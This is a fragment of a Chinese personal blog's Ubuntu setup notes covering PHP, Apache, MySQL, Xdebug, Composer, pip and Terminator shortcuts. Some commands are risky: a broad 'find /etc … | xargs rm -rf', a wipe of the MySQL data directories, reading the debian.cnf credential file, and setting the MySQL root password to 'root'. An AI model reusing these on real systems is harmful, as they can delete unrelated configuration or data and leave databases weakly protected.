class="line">sudo a2enmod php7.1</span><br><span class="line"># 禁用一个php版本</span><br><span class="line">sudo a2dismod php7.1</span><br><span class="line">#重启Apache2</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<p>卸载php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、删除php的相关包及配置</span><br><span class="line">   sudo apt-get autoremove php7*</span><br><span class="line">二、删除关联</span><br><span class="line">   sudo find &#x2F;etc -name &quot;*php*&quot; |xargs rm -rf</span><br><span class="line">三、清除dept列表</span><br><span class="line">   sudo apt purge &#96;dpkg -l | grep php| awk &#39;&#123;print $2&#125;&#39; |tr &quot;\n&quot; &quot; &quot;&#96;</span><br><span class="line">四、检查是否卸载干净（无返回就是卸载完成）</span><br><span class="line">   dpkg -l | grep php7.0</span><br></pre></td></tr></table></figure>

<p>安装php、apache2、 mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt list | grep libapache2-mod-php*</span><br><span class="line">sudo apt-get install php7.2 libapache2-mod-php7.2</span><br><span class="line">sudo apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure>

<p>ubuntu 18安装mysql过程未出现设置密码界面，修改默认密码方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cat &#x2F;etc&#x2F;mysql&#x2F;debian.cnf</span><br></pre></td></tr></table></figure>

<img src="/2019/05/04/%E9%85%8D%E7%BD%AE/image-20211018080209019.png" alt="image-20211018080209019" style="zoom:150%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u debian-sys-maint -p</span><br></pre></td></tr></table></figure>

<p><a href="https://zhuanlan.zhihu.com/p/348317883" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/348317883</a></p>
<p>输入上图中密码，登录后，修改root密码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use mysql;                   </span><br><span class="line"></span><br><span class="line">update mysql.user set authentication_string&#x3D;password(&#39;root&#39;) where user&#x3D;&#39;root&#39; and Host &#x3D;&#39;localhost&#39;;    </span><br><span class="line"></span><br><span class="line">update user set  plugin&#x3D;&quot;mysql_native_password&quot;;     </span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">quit;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter user root@localhost identified with caching_sha2_password by &quot;root&quot;; #mysql8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt purge mysql-*</span><br><span class="line"></span><br><span class="line">sudo rm -rf &#x2F;etc&#x2F;mysql&#x2F; &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line"></span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure>

<p>修改/var/www/html目录权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chown -R www-data:www-data &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">sudo chmod -R 755 &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>

<p>安装php扩展</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install php7.2-dev （phpize命令不存在）</span><br><span class="line">sudo pecl install xdebug</span><br></pre></td></tr></table></figure>

<p>php.ini文件位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;php&#x2F;7.2&#x2F;apache2&#x2F;php.ini</span><br></pre></td></tr></table></figure>

<p>配置xdebug3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;xdebug.so</span><br><span class="line">xdebug.mode&#x3D;debug,coverage,develop,trace,</span><br><span class="line">xdebug.client_host&#x3D;127.0.0.1</span><br><span class="line">xdebug.client_port&#x3D;&quot;9003&quot;</span><br><span class="line">xdebug.overload_var_dump&#x3D;1</span><br><span class="line">xdebug.trace_format &#x3D; 1</span><br><span class="line"></span><br><span class="line">[Xdebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;xdebug.so</span><br><span class="line">xdebug.mode&#x3D;trace</span><br><span class="line">xdebug.start_with_request&#x3D;trigger</span><br><span class="line">xdebug.trigger_value&#x3D;StartProfileForMe</span><br><span class="line">xdebug.trace_output_name &#x3D; xdebug.trace.%t.%s</span><br><span class="line">xdebug.output_dir &#x3D; &#x2F;var&#x2F;www&#x2F;tmp</span><br><span class="line">xdebug.trace_format&#x3D;1</span><br><span class="line"></span><br><span class="line">XDEBUG_TRACE&#x3D;StartProfileForMe</span><br><span class="line"></span><br><span class="line">[Xdebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20200930&#x2F;xdebug.so</span><br><span class="line">xdebug.mode&#x3D;trace</span><br><span class="line">xdebug.start_with_request&#x3D;trigger</span><br><span class="line">xdebug.trigger_value&#x3D;StartProfileForMe</span><br><span class="line">xdebug.trace_output_name &#x3D; xdebug</span><br><span class="line">xdebug.output_dir &#x3D; &#x2F;tmp</span><br><span class="line">xdebug.trace_format&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/04/%E9%85%8D%E7%BD%AE/image-20211029104511689.png" alt="image-20211029104511689"></p>
<h3 id="ubuntu18安装composer"><a href="#ubuntu18安装composer" class="headerlink" title="ubuntu18安装composer"></a>ubuntu18安装composer</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一种方法：sudo apt-get install composer</span><br><span class="line">第二种方法：直接使用composer.phar可执行文件</span><br></pre></td></tr></table></figure>

<h4 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 <code>init</code></h4><p>在 <a href="https://docs.phpcomposer.com/02-libraries.html" target="_blank" rel="noopener">“库”</a> 那一章我们看到了如何手动创建 <code>composer.json</code> 文件。实际上还有一个 <code>init</code> 命令可以更容易的做到这一点。</p>
<p>当您运行该命令，它会以交互方式要求您填写一些信息，同时聪明的使用一些默认值。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar init</span><br></pre></td></tr></table></figure>

<h5 id="初始化-参数"><a href="#初始化-参数" class="headerlink" title="初始化-参数"></a>初始化-参数</h5><ul>
<li><strong>–name:</strong> 包的名称。</li>
<li><strong>–description:</strong> 包的描述。</li>
<li><strong>–author:</strong> 包的作者。</li>
<li><strong>–homepage:</strong> 包的主页。</li>
<li><strong>–require:</strong> 需要依赖的其它包，必须要有一个版本约束。并且应该遵循 <code>foo/bar:1.0.0</code> 这样的格式。</li>
<li><strong>–require-dev:</strong> 开发版的依赖包，内容格式与 <strong>–require</strong> 相同。</li>
<li><strong>–stability (-s):</strong> <code>minimum-stability</code> 字段的值。</li>
</ul>
<h4 id="安装-install"><a href="#安装-install" class="headerlink" title="安装 install"></a>安装 <code>install</code></h4><p><code>install</code> 命令从当前目录读取 <code>composer.json</code> 文件，处理了依赖关系，并把其安装到 <code>vendor</code> 目录下。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar install</span><br></pre></td></tr></table></figure>

<p>如果当前目录下存在 <code>composer.lock</code> 文件，它会从此文件读取依赖版本，而不是根据 <code>composer.json</code> 文件去获取依赖。这确保了该库的每个使用者都能得到相同的依赖版本。</p>
<p>如果没有 <code>composer.lock</code> 文件，composer 将在处理完依赖关系后创建它。</p>
<h5 id="安装-参数"><a href="#安装-参数" class="headerlink" title="安装-参数"></a>安装-参数</h5><ul>
<li><strong>–prefer-source:</strong> 下载包的方式有两种： <code>source</code> 和 <code>dist</code>。对于稳定版本 composer 将默认使用 <code>dist</code> 方式。而 <code>source</code> 表示版本控制源 。如果 <code>--prefer-source</code> 是被启用的，composer 将从 <code>source</code> 安装（如果有的话）。如果想要使用一个 bugfix 到你的项目，这是非常有用的。并且可以直接从本地的版本库直接获取依赖关系。</li>
<li><strong>–prefer-dist:</strong> 与 <code>--prefer-source</code> 相反，composer 将尽可能的从 <code>dist</code> 获取，这将大幅度的加快在 build servers 上的安装。这也是一个回避 git 问题的途径，如果你不清楚如何正确的设置。</li>
<li><strong>–dry-run:</strong> 如果你只是想演示而并非实际安装一个包，你可以运行 <code>--dry-run</code> 命令，它将模拟安装并显示将会发生什么。</li>
<li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包（这是一个默认值）。</li>
<li><strong>–no-dev:</strong> 跳过 <code>require-dev</code> 字段中列出的包。</li>
<li><strong>–no-scripts:</strong> 跳过 <code>composer.json</code> 文件中定义的脚本。</li>
<li><strong>–no-plugins:</strong> 关闭 plugins。</li>
<li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li>
<li><strong>–optimize-autoloader (-o):</strong> 转换 PSR-0/4 autoloading 到 classmap 可以获得更快的加载支持。特别是在生产环境下建议这么做，但由于运行需要一些时间，因此并没有作为默认值。</li>
</ul>
<h4 id="更新-update"><a href="#更新-update" class="headerlink" title="更新 update"></a>更新 <code>update</code></h4><p>为了获取依赖的最新版本，并且升级 <code>composer.lock</code> 文件，你应该使用 <code>update</code> 命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar update</span><br></pre></td></tr></table></figure>

<p>这将解决项目的所有依赖，并将确切的版本号写入 <code>composer.lock</code>。</p>
<p>如果你只是想更新几个包，你可以像这样分别列出它们：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar update vendor/package vendor/package2</span><br></pre></td></tr></table></figure>

<p>你还可以使用通配符进行批量更新：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar update vendor/*</span><br></pre></td></tr></table></figure>

<h5 id="更新-参数"><a href="#更新-参数" class="headerlink" title="更新-参数"></a>更新-参数</h5><ul>
<li><strong>–prefer-source:</strong> 当有可用的包时，从 <code>source</code> 安装。</li>
<li><strong>–prefer-dist:</strong> 当有可用的包时，从 <code>dist</code> 安装。</li>
<li><strong>–dry-run:</strong> 模拟命令，并没有做实际的操作。</li>
<li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包（这是一个默认值）。</li>
<li><strong>–no-dev:</strong> 跳过 <code>require-dev</code> 字段中列出的包。</li>
<li><strong>–no-scripts:</strong> 跳过 <code>composer.json</code> 文件中定义的脚本。</li>
<li><strong>–no-plugins:</strong> 关闭 plugins。</li>
<li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li>
<li><strong>–optimize-autoloader (-o):</strong> 转换 PSR-0/4 autoloading 到 classmap 可以获得更快的加载支持。特别是在生产环境下建议这么做，但由于运行需要一些时间，因此并没有作为默认值。</li>
<li><strong>–lock:</strong> 仅更新 lock 文件的 hash，取消有关 lock 文件过时的警告。</li>
<li><strong>–with-dependencies</strong> 同时更新白名单内包的依赖关系，这将进行递归更新。</li>
</ul>
<h4 id="申明依赖-require"><a href="#申明依赖-require" class="headerlink" title="申明依赖 require"></a>申明依赖 <code>require</code></h4><p><code>require</code> 命令增加新的依赖包到当前目录的 <code>composer.json</code> 文件中。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar require</span><br></pre></td></tr></table></figure>

<p>在添加或改变依赖时， 修改后的依赖关系将被安装或者更新。</p>
<p>如果你不希望通过交互来指定依赖包，你可以在这条令中直接指明依赖包。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar require vendor/package:2.* vendor/package2:dev-master</span><br></pre></td></tr></table></figure>

<h5 id="申明依赖-参数"><a href="#申明依赖-参数" class="headerlink" title="申明依赖-参数"></a>申明依赖-参数</h5><ul>
<li><strong>–prefer-source:</strong> 当有可用的包时，从 <code>source</code> 安装。</li>
<li><strong>–prefer-dist:</strong> 当有可用的包时，从 <code>dist</code> 安装。</li>
<li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包。</li>
<li><strong>–no-update:</strong> 禁用依赖关系的自动更新。</li>
<li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li>
<li><strong>–update-with-dependencies</strong> 一并更新新装包的依赖。</li>
</ul>
<h4 id="全局执行-global"><a href="#全局执行-global" class="headerlink" title="全局执行 global"></a>全局执行 <code>global</code></h4><p><code>global</code> 命令允许你在 <a href="https://docs.phpcomposer.com/03-cli.html#COMPOSER_HOME" target="_blank" rel="noopener">COMPOSER_HOME</a> 目录下执行其它命令，像 <code>install</code>、<code>require</code> 或 <code>update</code>。</p>
<p>并且如果你将 <code>$COMPOSER_HOME/vendor/bin</code> 加入到了 <code>$PATH</code> 环境变量中，你就可以用它在命令行中安装全局应用，下面是一个例子：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar global require fabpot/php-cs-fixer:dev-master</span><br></pre></td></tr></table></figure>

<p>现在 <code>php-cs-fixer</code> 就可以在全局范围使用了（假设你已经设置了你的 PATH）。如果稍后你想更新它，你只需要运行 <code>global update</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar global update</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu安装及更新-pip2-pip3"><a href="#ubuntu安装及更新-pip2-pip3" class="headerlink" title="ubuntu安装及更新 pip2 pip3"></a>ubuntu安装及更新 pip2 pip3</h3><p>pip2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python-pip</span><br><span class="line">python2 -m pip install -U pip</span><br></pre></td></tr></table></figure>

<p>pip3</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>

<h3 id="pip安装requirements"><a href="#pip安装requirements" class="headerlink" title="pip安装requirements"></a>pip安装requirements</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirement.txt</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu安装python3-9"><a href="#ubuntu安装python3-9" class="headerlink" title="ubuntu安装python3.9"></a>ubuntu安装python3.9</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes&#x2F;ppa</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3.9</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/peiwang245/article/details/98317863" target="_blank" rel="noopener">https://blog.csdn.net/peiwang245/article/details/98317863</a></p>
<p>pip问题：</p>
<p><a href="https://blog.csdn.net/sudakuang/article/details/101372007?spm=1001.2101.3001.6650.10&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link" target="_blank" rel="noopener">https://blog.csdn.net/sudakuang/article/details/101372007?spm=1001.2101.3001.6650.10&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link</a></p>
<p><a href="https://blog.csdn.net/ZZQHELLO2018/article/details/106998144" target="_blank" rel="noopener">https://blog.csdn.net/ZZQHELLO2018/article/details/106998144</a></p>
<h3 id="ubuntu-删除Trash"><a href="#ubuntu-删除Trash" class="headerlink" title="ubuntu 删除Trash"></a>ubuntu 删除Trash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf ~&#x2F;.local&#x2F;share&#x2F;Trash&#x2F;*</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu-安装-sshd"><a href="#ubuntu-安装-sshd" class="headerlink" title="ubuntu 安装 sshd"></a>ubuntu 安装 sshd</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu-安装-sqlite3"><a href="#ubuntu-安装-sqlite3" class="headerlink" title="ubuntu 安装 sqlite3"></a>ubuntu 安装 sqlite3</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install sqlite3</span><br><span class="line">sudo apt-get install libsqlite3-</span><br></pre></td></tr></table></figure>



<h3 id="ubuntu-安装terminator分屏"><a href="#ubuntu-安装terminator分屏" class="headerlink" title="ubuntu 安装terminator分屏"></a>ubuntu 安装terminator分屏</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install terminator</span><br></pre></td></tr></table></figure>

<ul>
<li>快捷键</li>
</ul>
<p>Ctrl+Shift+O<br>  Split terminals Horizontally.（上下开新窗口）<br>Ctrl+Shift+E<br>  Split terminals Vertically.（垂直开新窗口）<br>Ctrl+Shift+Right<br>  Move parent dragbar Right.（放大当前窗口 向右）<br>Ctrl+Shift+Left<br>  Move parent dragbar Left.<br>Ctrl+Shift+Up<br>  Move parent dragbar Up.<br>Ctrl+Shift+Down<br>  Move parent dragbar Down.<br>Ctrl+Shift+W<br>  Close the current terminal.<br>Alt+Up<br>  Move to the terminal above the current one.（切换当前窗口）<br>Alt+Down<br>  Move to the terminal below the current one.<br>Alt+Left<br>  Move to the terminal left of the current one.<br>Alt+Right<br>  Move to the terminal right of the current one.<br>Ctrl+Shift+S<br>  Hide/Show Scrollbar.（隐藏滚动条）<br>Ctrl+Shift+F<br>  Search within terminal scrollback<br>Ctrl+Shift+N or Ctrl+Tab<br>  Move to next terminal within the same tab, use Ctrl+PageDown to move to the next tab. If cycle_term_tab is False, cycle within the same tab will be disabled<br>Ctrl+Shift+P or Ctrl+Shift+Tab<br>  Move to previous terminal within the same tab, use Ctrl+PageUp to move to the previous tab. If cycle_term_tab is False, cycle within the same tab will be disabled<br>Ctrl+Shift+C<br>  Copy selected text to clipboard<br>Ctrl+Shift+V<br>  Paste clipboard text<br>Ctrl+Shift+Q<br>  Quits Terminator<br>Ctrl+Shift+X （最大化当前窗口）<br>  Toggle between showing all terminals and only showing the current one (maximise).<br>Ctrl+Shift+Z<br>  Toggle between showing all terminals and only showing a scaled version of the current one (zoom).<br>Ctrl+Shift+T<br>  Open new tab<br>Ctrl+Shift+Alt+T<br>  Open new tab at root level, if using extreme_tabs.<br>Ctrl+PageDown<br>  Move to next Tab<br>Ctrl+PageUp<br>  Move to previous Tab<br>Ctrl+Shift+PageDown<br>  Swap tab position with next Tab<br>Ctrl+Shift+PageUp<br>  Swap tab position with previous Tab<br>Ctrl+Shift+F<br>  Open buffer search bar to find substrings in the scrollback buffer. Hit Escape to cancel.<br>Ctrl+Plus (+)<br>  Increase font size. Note: this may require you to press shift, depending on your keyboard<br>Ctrl+Minus (-)<br>  Decrease font size. Note: this may require you to press shift, depending on your keyboard<br>Ctrl+Zero (0)<br>  Restore font size to original setting.<br>F11<br>  Toggle fullscreen（放大当前窗口）<br>Ctrl+Shift+R<br>  Reset terminal state<br>Ctrl+Shift+G<br>  Reset terminal state and clear window</p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
</search>
